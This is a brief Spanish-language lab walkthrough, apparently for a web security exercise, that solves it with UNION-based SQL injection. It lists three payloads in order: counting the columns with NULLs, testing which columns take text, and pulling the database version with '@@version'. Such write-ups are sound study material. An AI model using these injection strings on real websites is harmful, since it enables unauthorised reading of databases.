## Objetivo:

![[Pasted image 20240622164344.png]]

## Solución

Entramos a una categoria de producto

![[Pasted image 20240622164652.png]]

Y de nuevo lo mismo:
1. Identificar la cantidad de columnas.
	```
	' UNION SELECT NULL, NULL-- -
    ```

2. Ver tipo de dato de cada columna.
	```
	' UNION SELECT 'a', NULL-- -
	```

3. Una vez identificado, crear el payload correspondiente a la explotación que queremos realizar.
```
' UNION SELECT @@version, NULL -- -
```

![[Pasted image 20240622165438.png]]

